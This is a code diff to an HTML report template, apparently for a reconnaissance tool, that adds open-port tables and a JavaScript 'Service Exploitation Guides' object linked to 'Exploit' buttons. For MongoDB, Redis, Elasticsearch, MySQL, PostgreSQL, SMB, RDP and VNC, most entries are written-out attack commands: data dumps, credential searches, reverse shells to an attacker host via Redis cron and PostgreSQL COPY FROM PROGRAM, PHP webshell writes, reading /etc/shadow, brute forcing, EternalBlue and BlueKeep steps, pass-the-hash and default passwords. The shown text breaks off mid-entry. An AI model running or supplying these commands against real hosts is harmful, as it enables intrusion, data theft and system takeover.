@@ -785,6 +785,11 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 <span>IP Addresses</span>
                 <span class="nav-count">{{ stats.ips }}</span>
             </a>
+            <a href="#ports" class="nav-item">
+                <span class="nav-icon">🔌</span>
+                <span>Open Ports</span>
+                <span class="nav-count">{{ stats.ports }}</span>
+            </a>
             <a href="#webapps" class="nav-item">
                 <span class="nav-icon">🔗</span>
                 <span>Web Apps</span>
@@ -1010,43 +1015,203 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 <div class="section-header" onclick="toggleSection(this)">
                     <div class="section-title">
                         <div class="section-icon ips">🖥️</div>
-                        <span>IP Addresses</span>
+                        <span>IP Addresses & Services</span>
                     </div>
-                    <div class="section-badge">{{ ips|length }} found</div>
+                    <div class="section-badge">{{ ips|length }} hosts, {{ stats.ports }} ports</div>
                 </div>
                 <div class="section-content">
                     <div class="search-box">
                         <span class="search-icon">🔍</span>
-                        <input type="text" class="search-input" placeholder="Search IPs..." onkeyup="filterTable(this, 'ips-table')">
+                        <input type="text" class="search-input" placeholder="Search IPs, services, ports..." onkeyup="filterTable(this, 'ips-table')">
                     </div>
                     <table class="data-table" id="ips-table">
                         <thead>
                             <tr>
                                 <th>IP Address</th>
-                                <th>ASN</th>
-                                <th>Organization</th>
-                                <th>Open Ports</th>
+                                <th>Organization / ASN</th>
+                                <th>Location</th>
                                 <th>Cloud</th>
+                                <th>Services</th>
                             </tr>
                         </thead>
                         <tbody>
                             {% for ip in ips %}
                             <tr>
-                                <td class="mono">{{ ip.address }}</td>
-                                <td>{{ ip.asn or '-' }}</td>
-                                <td>{{ ip.asn_org or '-' }}</td>
-                                <td class="mono">{{ ip.ports|map(attribute='number')|list|join(', ') or '-' }}</td>
                                 <td>
-                                    {% if ip.cloud_provider %}
-                                    <span class="tag tag-tech">{{ ip.cloud_provider.value }}</span>
+                                    <div class="mono" style="font-weight: 600;">{{ ip.address }}</div>
+                                    {% if ip.hostnames %}
+                                    <div style="font-size: 11px; color: var(--text-tertiary); margin-top: 4px;">
+                                        {{ ip.hostnames[:2]|join(', ') }}{% if ip.hostnames|length > 2 %} +{{ ip.hostnames|length - 2 }}{% endif %}
+                                    </div>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <div>{{ ip.asn_org or '-' }}</div>
+                                    {% if ip.asn %}
+                                    <div style="font-size: 11px; color: var(--text-tertiary);">AS{{ ip.asn }}</div>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    {% if ip.geolocation and ip.geolocation.country %}
+                                    <div>{{ ip.geolocation.city }}{% if ip.geolocation.city and ip.geolocation.country %}, {% endif %}{{ ip.geolocation.country_code or ip.geolocation.country }}</div>
                                     {% else %}
                                     -
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    {% if ip.cloud_provider %}
+                                    <span class="tag tag-tech">{{ ip.cloud_provider.value|upper }}</span>
+                                    {% if ip.cloud_region %}
+                                    <div style="font-size: 10px; color: var(--text-tertiary); margin-top: 2px;">{{ ip.cloud_region }}</div>
+                                    {% endif %}
+                                    {% else %}
+                                    -
+                                    {% endif %}
+                                </td>
+                                <td style="max-width: 400px;">
+                                    {% if ip.ports %}
+                                    <div class="services-list">
+                                        {% for port in ip.ports[:8] %}
+                                        <div class="service-item" style="display: flex; align-items: center; gap: 8px; padding: 4px 0; border-bottom: 1px solid var(--border-subtle);">
+                                            <span class="tag {% if port.number in [22, 80, 443] %}tag-info{% elif port.number in [21, 23, 3389, 5900] %}tag-high{% elif port.number in [27017, 6379, 9200, 3306, 5432, 445, 2375] %}tag-critical{% else %}tag-alive{% endif %}" style="min-width: 55px; text-align: center;">{{ port.number }}/{{ port.protocol }}</span>
+                                            <div style="flex: 1; min-width: 0;">
+                                                <span style="font-weight: 500;">{{ port.service.name or 'unknown' }}</span>
+                                                {% if port.service.product %}
+                                                <span style="color: var(--text-secondary);"> - {{ port.service.product }}{% if port.service.version %} {{ port.service.version }}{% endif %}</span>
+                                                {% endif %}
+                                                {% if port.service.banner %}
+                                                <div style="font-size: 10px; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 300px;" title="{{ port.service.banner }}">{{ port.service.banner[:80] }}</div>
+                                                {% endif %}
+                                            </div>
+                                        </div>
+                                        {% endfor %}
+                                        {% if ip.ports|length > 8 %}
+                                        <div style="padding: 4px 0; color: var(--text-muted); font-size: 12px;">+ {{ ip.ports|length - 8 }} more services</div>
+                                        {% endif %}
+                                    </div>
+                                    {% else %}
+                                    <span class="tag tag-dead">No open ports</span>
                                     {% endif %}
                                 </td>
                             </tr>
                             {% endfor %}
                         </tbody>
                     </table>
+                </div>
+            </section>
+
+            <!-- Open Ports Summary -->
+            <section id="ports" class="section-card">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <div class="section-title">
+                        <div class="section-icon ports" style="background: var(--color-success-muted);">🔌</div>
+                        <span>Open Ports & Exploitation Guide</span>
+                    </div>
+                    <div class="section-badge">{{ stats.ports }} ports across {{ ips|length }} hosts</div>
+                </div>
+                <div class="section-content">
+                    {% set has_ports = [] %}
+                    {% for ip in ips %}{% if ip.ports %}{% set _ = has_ports.append(1) %}{% endif %}{% endfor %}
+
+                    {% if has_ports %}
+                    <!-- High-Risk Ports Alert -->
+                    <div style="margin-bottom: 20px; padding: 16px; background: var(--color-danger-muted); border-radius: var(--radius-md); border: 1px solid rgba(248, 113, 113, 0.3);">
+                        <h4 style="color: var(--color-danger); margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                            <span>⚠️</span> High-Risk Services - Click for Exploitation Details
+                        </h4>
+                        <table class="data-table" style="background: transparent;">
+                            <thead>
+                                <tr>
+                                    <th>IP Address</th>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Product</th>
+                                    <th>Risk Category</th>
+                                    <th>Exploit Guide</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for ip in ips %}
+                                {% for port in ip.ports %}
+                                {% if port.number in [21, 23, 445, 3389, 5900, 27017, 6379, 9200, 3306, 5432, 2375, 2376, 6443, 2379, 5984, 11211, 1433, 8080, 9000] %}
+                                <tr>
+                                    <td class="mono">{{ ip.address }}</td>
+                                    <td><span class="tag tag-critical">{{ port.number }}/{{ port.protocol }}</span></td>
+                                    <td>{{ port.service.name or 'unknown' }}</td>
+                                    <td>{{ port.service.product or '-' }} {{ port.service.version or '' }}</td>
+                                    <td>
+                                        {% if port.number == 27017 %}Database (MongoDB)
+                                        {% elif port.number == 6379 %}Database (Redis)
+                                        {% elif port.number == 9200 %}Database (Elasticsearch)
+                                        {% elif port.number == 3306 %}Database (MySQL)
+                                        {% elif port.number == 5432 %}Database (PostgreSQL)
+                                        {% elif port.number == 1433 %}Database (MSSQL)
+                                        {% elif port.number == 445 %}File Share (SMB)
+                                        {% elif port.number == 3389 %}Remote Access (RDP)
+                                        {% elif port.number == 5900 %}Remote Access (VNC)
+                                        {% elif port.number == 21 %}Cleartext (FTP)
+                                        {% elif port.number == 23 %}Cleartext (Telnet)
+                                        {% elif port.number in [2375, 2376] %}Container (Docker)
+                                        {% elif port.number == 6443 %}Container (Kubernetes)
+                                        {% elif port.number == 2379 %}Container (etcd)
+                                        {% elif port.number == 8080 %}CI/CD (Jenkins)
+                                        {% elif port.number == 9000 %}Container (Portainer)
+                                        {% else %}Sensitive Service
+                                        {% endif %}
+                                    </td>
+                                    <td><button class="view-btn" onclick="showServiceGuide({{ port.number }})">🔓 Exploit</button></td>
+                                </tr>
+                                {% endif %}
+                                {% endfor %}
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <!-- Full Port List -->
+                    <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 13px; text-transform: uppercase;">All Discovered Ports</h4>
+                    <div class="search-box">
+                        <span class="search-icon">🔍</span>
+                        <input type="text" class="search-input" placeholder="Search ports, services, IPs..." onkeyup="filterTable(this, 'ports-table')">
+                    </div>
+                    <table class="data-table" id="ports-table">
+                        <thead>
+                            <tr>
+                                <th>IP Address</th>
+                                <th>Port</th>
+                                <th>Service</th>
+                                <th>Product / Version</th>
+                                <th>Banner</th>
+                                <th>Exploit</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for ip in ips %}
+                            {% for port in ip.ports %}
+                            <tr>
+                                <td class="mono">{{ ip.address }}</td>
+                                <td><span class="tag {% if port.number in [27017, 6379, 9200, 3306, 5432, 445, 2375, 6443, 2379] %}tag-critical{% elif port.number in [21, 23, 3389, 5900, 2376, 11211, 1433] %}tag-high{% elif port.number in [22, 80, 443] %}tag-alive{% else %}tag-info{% endif %}">{{ port.number }}/{{ port.protocol }}</span></td>
+                                <td>{{ port.service.name or 'unknown' }}</td>
+                                <td>{{ port.service.product or '-' }}{% if port.service.version %} <span style="color: var(--text-tertiary);">{{ port.service.version }}</span>{% endif %}</td>
+                                <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 11px; color: var(--text-muted);" title="{{ port.service.banner }}">{{ port.service.banner[:100] if port.service.banner else '-' }}</td>
+                                <td>
+                                    {% if port.number in [21, 22, 23, 445, 2375, 2376, 2379, 3306, 3389, 5432, 5900, 5984, 6379, 6443, 9200, 11211, 27017, 1433, 8080, 9000] %}
+                                    <button class="view-btn" style="padding: 4px 8px; font-size: 11px;" onclick="showServiceGuide({{ port.number }})">🔓</button>
+                                    {% else %}
+                                    <span style="color: var(--text-muted);">-</span>
+                                    {% endif %}
+                                </td>
+                            </tr>
+                            {% endfor %}
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                    {% else %}
+                    <div class="empty-state">
+                        <div class="empty-state-icon">🔌</div>
+                        <div>No open ports discovered</div>
+                    </div>
+                    {% endif %}
                 </div>
             </section>
 
@@ -1351,6 +1516,66 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         </div>
     </div>
 
+    <!-- Service Guidance Modal -->
+    <div id="serviceGuideModal" class="modal" onclick="closeServiceGuide(event)">
+        <div class="modal-content" style="max-width: 800px; max-height: 90vh; overflow-y: auto; background: var(--bg-surface); border-radius: var(--radius-lg); padding: 24px;">
+            <span class="modal-close" onclick="closeServiceGuide()">&times;</span>
+            <div id="serviceGuideContent"></div>
+        </div>
+    </div>
+
+    <style>
+        .service-guide { color: var(--text-primary); }
+        .service-guide h3 {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid var(--border-subtle);
+        }
+        .service-guide .risk-badge {
+            padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 600; text-transform: uppercase;
+        }
+        .service-guide .risk-critical { background: var(--color-danger-muted); color: var(--color-danger); }
+        .service-guide .risk-high { background: var(--color-warning-muted); color: var(--color-warning); }
+        .service-guide .risk-medium { background: var(--color-info-muted); color: var(--color-info); }
+        .service-guide .risk-low { background: var(--color-success-muted); color: var(--color-success); }
+        .service-guide .risk-info { background: var(--bg-elevated); color: var(--text-secondary); }
+        .service-guide .desc { color: var(--text-secondary); margin-bottom: 20px; line-height: 1.6; }
+        .service-guide section { margin-bottom: 20px; }
+        .service-guide h4 {
+            color: var(--text-primary); font-size: 14px; font-weight: 600;
+            margin-bottom: 10px; display: flex; align-items: center; gap: 8px;
+        }
+        .service-guide ul, .service-guide ol {
+            margin: 0; padding-left: 20px; color: var(--text-secondary);
+        }
+        .service-guide li { margin-bottom: 6px; line-height: 1.5; }
+        .service-guide code {
+            background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px;
+            font-family: monospace; font-size: 12px; color: var(--accent-primary);
+        }
+        .service-guide .creds-list {
+            display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px;
+        }
+        .service-guide .cred-item {
+            background: var(--color-warning-muted); color: var(--color-warning);
+            padding: 4px 10px; border-radius: 4px; font-family: monospace; font-size: 12px;
+        }
+        .service-guide .ref-link {
+            color: var(--accent-primary); text-decoration: none; word-break: break-all;
+        }
+        .service-guide .ref-link:hover { text-decoration: underline; }
+        .service-guide .tools-list {
+            display: flex; flex-wrap: wrap; gap: 8px;
+        }
+        .service-guide .tool-item {
+            background: var(--accent-primary-muted); color: var(--accent-primary);
+            padding: 4px 10px; border-radius: 4px; font-size: 12px;
+        }
+        .service-guide .cve-item {
+            background: var(--color-danger-muted); color: var(--color-danger);
+            padding: 4px 10px; border-radius: 4px; font-size: 12px; margin-right: 8px; margin-bottom: 8px; display: inline-block;
+        }
+    </style>
+
     <script>
         function toggleSection(header) {
             const content = header.nextElementSibling;
@@ -1419,16 +1644,27 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 
         // Modal functions
         function openModal(imageSrc, url) {
-            const modal = document.getElementById('screenshotModal');
-            const modalImg = document.getElementById('modalImage');
-            const modalUrl = document.getElementById('modalUrl');
+            try {
+                console.log('openModal called with URL:', url);
+                const modal = document.getElementById('screenshotModal');
+                const modalImg = document.getElementById('modalImage');
+                const modalUrl = document.getElementById('modalUrl');
 
-            modal.classList.add('active');
-            modalImg.src = imageSrc;
-            modalUrl.href = url;
-            modalUrl.textContent = url;
+                if (!modal || !modalImg || !modalUrl) {
+                    console.error('Modal elements not found:', {modal, modalImg, modalUrl});
+                    return;
+                }
 
-            document.body.style.overflow = 'hidden';
+                modal.classList.add('active');
+                modalImg.src = imageSrc;
+                modalUrl.href = url;
+                modalUrl.textContent = url;
+
+                document.body.style.overflow = 'hidden';
+                console.log('Modal should now be visible');
+            } catch (e) {
+                console.error('Error in openModal:', e);
+            }
         }
 
         function closeModal(event) {
@@ -1444,8 +1680,1107 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 closeModal();
+                closeServiceGuide();
             }
         });
+
+        // Service Exploitation Guides - Detailed attack techniques
+        const serviceGuides = {
+            27017: {
+                name: "MongoDB",
+                risk: "critical",
+                description: "MongoDB NoSQL database - typically no authentication when exposed. Allows complete data access and potential RCE.",
+                attacks: [
+                    {
+                        title: "1. Connect & Enumerate",
+                        commands: [
+                            "mongo <ip>:27017",
+                            "show dbs",
+                            "use <database>",
+                            "show collections",
+                            "db.<collection>.find().pretty()"
+                        ]
+                    },
+                    {
+                        title: "2. Dump All Data",
+                        commands: [
+                            "mongodump --host <ip> --port 27017 --out /tmp/dump",
+                            "mongoexport --host <ip> --db <db> --collection <col> --out data.json"
+                        ]
+                    },
+                    {
+                        title: "3. Search for Credentials",
+                        commands: [
+                            "db.<collection>.find({$or: [{password: {$exists: true}}, {passwd: {$exists: true}}, {pwd: {$exists: true}}]})",
+                            "db.<collection>.find({email: /@/})",
+                            "db.users.find()"
+                        ]
+                    },
+                    {
+                        title: "4. Server-Side JavaScript Execution",
+                        commands: [
+                            "db.users.find({$where: 'sleep(5000)'})",
+                            "db.users.find({$where: function() { return this.a == this.b; }})"
+                        ]
+                    }
+                ],
+                credentials: ["No authentication by default"],
+                cves: ["CVE-2017-2638", "CVE-2019-2389"],
+                tools: ["mongo CLI", "mongodump", "mongoexport", "Nmap: nmap -sV --script mongodb-info <ip>", "Metasploit: use auxiliary/scanner/mongodb/mongodb_login"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb"]
+            },
+            6379: {
+                name: "Redis",
+                risk: "critical",
+                description: "Redis in-memory database - no auth by default. Can achieve RCE via SSH key injection or cron jobs.",
+                attacks: [
+                    {
+                        title: "1. Connect & Enumerate",
+                        commands: [
+                            "redis-cli -h <ip>",
+                            "INFO",
+                            "CONFIG GET *",
+                            "KEYS *",
+                            "GET <key>"
+                        ]
+                    },
+                    {
+                        title: "2. RCE via SSH Key Injection",
+                        commands: [
+                            "redis-cli -h <ip>",
+                            "CONFIG SET dir /root/.ssh",
+                            "CONFIG SET dbfilename authorized_keys",
+                            "SET ssh_key '\\n\\nssh-rsa AAAAB3NzaC1yc2E... user@host\\n\\n'",
+                            "SAVE",
+                            "# Then: ssh -i id_rsa root@<ip>"
+                        ]
+                    },
+                    {
+                        title: "3. RCE via Cron Job",
+                        commands: [
+                            "redis-cli -h <ip>",
+                            "CONFIG SET dir /var/spool/cron/crontabs",
+                            "CONFIG SET dbfilename root",
+                            "SET cron '\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1\\n\\n'",
+                            "SAVE"
+                        ]
+                    },
+                    {
+                        title: "4. RCE via Webshell (if web root known)",
+                        commands: [
+                            "CONFIG SET dir /var/www/html",
+                            "CONFIG SET dbfilename shell.php",
+                            "SET webshell '<?php system($_GET[cmd]); ?>'",
+                            "SAVE",
+                            "# Access: http://<ip>/shell.php?cmd=id"
+                        ]
+                    },
+                    {
+                        title: "5. Dump All Data",
+                        commands: [
+                            "redis-cli -h <ip> --scan",
+                            "redis-cli -h <ip> KEYS '*' | xargs -L1 redis-cli -h <ip> GET"
+                        ]
+                    }
+                ],
+                credentials: ["No authentication by default"],
+                cves: ["CVE-2022-0543 (Lua sandbox escape)", "CVE-2015-8080", "CVE-2015-4335"],
+                tools: ["redis-cli", "redis-rogue-server", "Nmap: nmap --script redis-info -p 6379 <ip>", "Metasploit: use auxiliary/scanner/redis/redis_server"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"]
+            },
+            9200: {
+                name: "Elasticsearch",
+                risk: "high",
+                description: "Elasticsearch search engine - exposes all indexed data via REST API. Often contains logs, PII, credentials.",
+                attacks: [
+                    {
+                        title: "1. Enumerate Cluster & Indices",
+                        commands: [
+                            "curl -X GET 'http://<ip>:9200/'",
+                            "curl -X GET 'http://<ip>:9200/_cat/indices?v'",
+                            "curl -X GET 'http://<ip>:9200/_cat/nodes?v'",
+                            "curl -X GET 'http://<ip>:9200/_cluster/health?pretty'"
+                        ]
+                    },
+                    {
+                        title: "2. Dump Index Data",
+                        commands: [
+                            "curl -X GET 'http://<ip>:9200/<index>/_search?pretty&size=1000'",
+                            "curl -X GET 'http://<ip>:9200/<index>/_search?q=password&pretty'",
+                            "curl -X GET 'http://<ip>:9200/_all/_search?q=password&pretty'"
+                        ]
+                    },
+                    {
+                        title: "3. Search for Sensitive Data",
+                        commands: [
+                            "curl -X GET 'http://<ip>:9200/_all/_search?q=password OR secret OR api_key&pretty'",
+                            "curl -X GET 'http://<ip>:9200/_all/_search?q=credit_card OR ssn&pretty'",
+                            "curl -X GET 'http://<ip>:9200/_all/_search' -d '{query:{match_all:{}}}' -H 'Content-Type: application/json'"
+                        ]
+                    },
+                    {
+                        title: "4. Bulk Data Exfiltration (Scroll API)",
+                        commands: [
+                            "elasticdump --input=http://<ip>:9200/<index> --output=dump.json --type=data"
+                        ]
+                    },
+                    {
+                        title: "5. RCE (Older Versions < 1.2)",
+                        commands: [
+                            "# CVE-2014-3120 - Groovy script execution",
+                            "# CVE-2014-3120: curl -X POST 'http://<ip>:9200/_search?pretty' with Groovy script payload",
+                        ]
+                    }
+                ],
+                credentials: ["No authentication by default (without X-Pack)"],
+                cves: ["CVE-2014-3120 (RCE)", "CVE-2015-1427 (Groovy RCE)", "CVE-2015-3337 (Directory traversal)"],
+                tools: ["curl", "elasticdump", "Nmap: nmap -p 9200 --script elasticsearch-info <ip>"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch"]
+            },
+            3306: {
+                name: "MySQL",
+                risk: "high",
+                description: "MySQL database - can read/write files on server, potentially achieve RCE via UDF or INTO OUTFILE.",
+                attacks: [
+                    {
+                        title: "1. Brute Force Credentials",
+                        commands: [
+                            "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<ip>",
+                            "nmap --script mysql-brute -p 3306 <ip>",
+                            "medusa -h <ip> -u root -P passwords.txt -M mysql"
+                        ]
+                    },
+                    {
+                        title: "2. Connect & Enumerate",
+                        commands: [
+                            "mysql -h <ip> -u root -p",
+                            "SHOW DATABASES;",
+                            "USE <database>;",
+                            "SHOW TABLES;",
+                            "SELECT * FROM users;"
+                        ]
+                    },
+                    {
+                        title: "3. Read Files from Server",
+                        commands: [
+                            "SELECT LOAD_FILE('/etc/passwd');",
+                            "SELECT LOAD_FILE('/etc/shadow');",
+                            "SELECT LOAD_FILE('/var/www/html/config.php');"
+                        ]
+                    },
+                    {
+                        title: "4. Write Webshell (INTO OUTFILE)",
+                        commands: [
+                            "SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
+                            "# Access: http://<ip>/shell.php?cmd=id"
+                        ]
+                    },
+                    {
+                        title: "5. UDF Exploitation for RCE",
+                        commands: [
+                            "# Compile UDF: gcc -g -shared -o raptor_udf2.so raptor_udf2.c",
+                            "# Upload and create function",
+                            "USE mysql;",
+                            "CREATE TABLE foo(line blob);",
+                            "INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));",
+                            "SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';",
+                            "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';",
+                            "SELECT do_system('id > /tmp/out; cat /tmp/out');"
+                        ]
+                    }
+                ],
+                credentials: ["root (no password)", "root:root", "root:mysql", "root:toor", "mysql:mysql", "admin:admin"],
+                cves: ["CVE-2012-2122 (Auth bypass)", "CVE-2016-6662 (RCE)"],
+                tools: ["mysql CLI", "Hydra", "Nmap: nmap --script mysql-* -p 3306 <ip>", "SQLMap", "Metasploit: use auxiliary/scanner/mysql/mysql_login"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"]
+            },
+            5432: {
+                name: "PostgreSQL",
+                risk: "high",
+                description: "PostgreSQL database - superuser can execute OS commands via COPY TO PROGRAM.",
+                attacks: [
+                    {
+                        title: "1. Brute Force Credentials",
+                        commands: [
+                            "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<ip>",
+                            "nmap --script pgsql-brute -p 5432 <ip>"
+                        ]
+                    },
+                    {
+                        title: "2. Connect & Enumerate",
+                        commands: [
+                            "psql -h <ip> -U postgres",
+                            "\\\\l  -- List databases",
+                            "\\\\c <database>  -- Connect to database",
+                            "\\\\dt  -- List tables",
+                            "SELECT * FROM users;"
+                        ]
+                    },
+                    {
+                        title: "3. RCE via COPY TO PROGRAM (Superuser)",
+                        commands: [
+                            "CREATE TABLE cmd_exec(cmd_output text);",
+                            "COPY cmd_exec FROM PROGRAM 'id';",
+                            "SELECT * FROM cmd_exec;",
+                            "COPY cmd_exec FROM PROGRAM 'cat /etc/passwd';",
+                            "# Reverse shell:",
+                            "COPY cmd_exec FROM PROGRAM 'bash -c bash -i >& /dev/tcp/<attacker>/4444 0>&1';"
+                        ]
+                    },
+                    {
+                        title: "4. Read Files",
+                        commands: [
+                            "SELECT pg_read_file('/etc/passwd');",
+                            "SELECT pg_read_file('/var/lib/postgresql/.pgpass');",
+                            "CREATE TABLE temp(data text);",
+                            "COPY temp FROM '/etc/passwd';",
+                            "SELECT * FROM temp;"
+                        ]
+                    },
+                    {
+                        title: "5. Write Files via Large Objects",
+                        commands: [
+                            "SELECT lo_creat(-1);  -- Returns OID",
+                            "INSERT INTO pg_largeobject VALUES (<oid>, 0, decode('<?php system($_GET[c]); ?>', 'escape'));",
+                            "SELECT lo_export(<oid>, '/var/www/html/shell.php');"
+                        ]
+                    }
+                ],
+                credentials: ["postgres:postgres", "postgres (no password)", "pgsql:pgsql"],
+                cves: ["CVE-2019-9193 (COPY FROM PROGRAM)"],
+                tools: ["psql", "pgcli", "Hydra", "Nmap: nmap --script pgsql-brute -p 5432 <ip>", "Metasploit: use auxiliary/scanner/postgres/postgres_login"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql"]
+            },
+            445: {
+                name: "SMB",
+                risk: "critical",
+                description: "SMB file sharing - extremely dangerous. EternalBlue, data theft, hash capture, lateral movement.",
+                attacks: [
+                    {
+                        title: "1. Enumerate Shares",
+                        commands: [
+                            "smbclient -L //<ip> -N",
+                            "smbmap -H <ip>",
+                            "crackmapexec smb <ip> --shares",
+                            "nmap --script smb-enum-shares -p 445 <ip>"
+                        ]
+                    },
+                    {
+                        title: "2. Access Shares & Download Files",
+                        commands: [
+                            "smbclient //<ip>/<share> -N",
+                            "smbget -R smb://<ip>/<share>",
+                            "# Inside smbclient: get <file>, mget *, recurse ON, prompt OFF"
+                        ]
+                    },
+                    {
+                        title: "3. EternalBlue Exploitation (MS17-010)",
+                        commands: [
+                            "nmap --script smb-vuln-ms17-010 -p 445 <ip>",
+                            "msfconsole",
+                            "use exploit/windows/smb/ms17_010_eternalblue",
+                            "set RHOSTS <ip>",
+                            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+                            "set LHOST <attacker>",
+                            "exploit"
+                        ]
+                    },
+                    {
+                        title: "4. SMBGhost (CVE-2020-0796)",
+                        commands: [
+                            "nmap --script smb-protocols -p 445 <ip>  # Check for SMBv3.1.1",
+                            "python3 smbghost_cve-2020-0796.py <ip>",
+                            "# Metasploit: use exploit/windows/smb/cve_2020_0796_smbghost"
+                        ]
+                    },
+                    {
+                        title: "5. Capture NTLM Hashes (Responder)",
+                        commands: [
+                            "responder -I eth0 -wrf",
+                            "# Or force connection: net use \\\\\\\\<attacker>\\\\share",
+                            "# Crack captured hash:",
+                            "hashcat -m 5600 hash.txt wordlist.txt"
+                        ]
+                    },
+                    {
+                        title: "6. PsExec / Remote Execution",
+                        commands: [
+                            "psexec.py <domain>/<user>:<password>@<ip>",
+                            "wmiexec.py <domain>/<user>:<password>@<ip>",
+                            "crackmapexec smb <ip> -u <user> -p <pass> -x 'whoami'"
+                        ]
+                    }
+                ],
+                credentials: ["guest (no password)", "administrator:password", "admin:admin"],
+                cves: ["CVE-2017-0144 (EternalBlue)", "CVE-2020-0796 (SMBGhost)", "CVE-2017-0143", "CVE-2008-4250 (MS08-067)"],
+                tools: ["smbclient", "smbmap", "CrackMapExec", "Impacket (psexec.py, smbexec.py)", "Responder", "Metasploit EternalBlue", "enum4linux"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"]
+            },
+            3389: {
+                name: "RDP",
+                risk: "high",
+                description: "Remote Desktop Protocol - brute force, BlueKeep RCE, session hijacking.",
+                attacks: [
+                    {
+                        title: "1. Brute Force Credentials",
+                        commands: [
+                            "hydra -l administrator -P passwords.txt rdp://<ip>",
+                            "ncrack -u administrator -P passwords.txt <ip>:3389",
+                            "crowbar -b rdp -s <ip>/32 -u admin -C passwords.txt"
+                        ]
+                    },
+                    {
+                        title: "2. BlueKeep Exploitation (CVE-2019-0708)",
+                        commands: [
+                            "nmap --script rdp-vuln-ms12-020,rdp-ntlm-info -p 3389 <ip>",
+                            "msfconsole",
+                            "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+                            "set RHOSTS <ip>",
+                            "set TARGET <target_number>",
+                            "exploit"
+                        ]
+                    },
+                    {
+                        title: "3. Connect with Valid Credentials",
+                        commands: [
+                            "xfreerdp /u:<user> /p:<password> /v:<ip>",
+                            "rdesktop -u <user> -p <password> <ip>",
+                            "# Pass-the-hash:",
+                            "xfreerdp /u:<user> /pth:<ntlm_hash> /v:<ip>"
+                        ]
+                    },
+                    {
+                        title: "4. Session Hijacking (Local Admin)",
+                        commands: [
+                            "# On compromised system:",
+                            "query user",
+                            "tscon <session_id> /dest:console",
+                            "# Or use Mimikatz: ts::sessions"
+                        ]
+                    },
+                    {
+                        title: "5. Enable RDP via Registry (Post-Exploit)",
+                        commands: [
+                            "reg add 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+                            "netsh firewall set service remotedesktop enable"
+                        ]
+                    }
+                ],
+                credentials: ["administrator:password", "admin:admin", "administrator:P@ssw0rd"],
+                cves: ["CVE-2019-0708 (BlueKeep)", "CVE-2019-1181 (DejaBlue)", "CVE-2019-1182", "CVE-2012-0002 (MS12-020)"],
+                tools: ["xfreerdp", "rdesktop", "Hydra", "Crowbar", "Ncrack", "Metasploit BlueKeep"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp"]
+            },
+            5900: {
+                name: "VNC",
+                risk: "high",
+                description: "VNC remote desktop - often weak/no passwords. Traffic is cleartext by default.",
+                attacks: [
+                    {
+                        title: "1. Brute Force Password",
+                        commands: [
+                            "hydra -P passwords.txt vnc://<ip>",
+                            "nmap --script vnc-brute -p 5900 <ip>",
+                            "medusa -h <ip> -M vnc -P passwords.txt"
+                        ]
+                    },
+                    {
+                        title: "2. Connect with No/Blank Password",
+                        commands: [
+                            "vncviewer <ip>:5900",
+                            "# If prompted for password, try blank or common ones"
+                        ]
+                    },
+                    {
+                        title: "3. Authentication Bypass (Some Versions)",
+                        commands: [
+                            "nmap --script vnc-info -p 5900 <ip>",
+                            "# Check for security type 'None' (Type 1)",
+                            "msfconsole",
+                            "use auxiliary/scanner/vnc/vnc_none_auth"
+                        ]
+                    },
+                    {
+                        title: "4. Decrypt VNC Password from Registry/File",
+                        commands: [
+                            "# Windows: HKCU\\\\Software\\\\ORL\\\\WinVNC3\\\\Password",
+                            "# Linux: ~/.vnc/passwd",
+                            "vncpwd <encrypted_password>",
+                            "# Online: https://github.com/trinitronx/vncpasswd.py"
+                        ]
+                    },
+                    {
+                        title: "5. Screenshot/Record Session",
+                        commands: [
+                            "vncsnapshot <ip>:0 screenshot.jpg",
+                            "# Record with ffmpeg after connecting"
+                        ]
+                    }
+                ],
+                credentials: ["(blank)", "password", "vnc", "1234", "admin", "123456"],
+                cves: ["CVE-2019-15678", "CVE-2019-8287", "CVE-2006-2369"],
+                tools: ["vncviewer", "Hydra", "vncpwd", "Metasploit vnc_login", "vncsnapshot"],
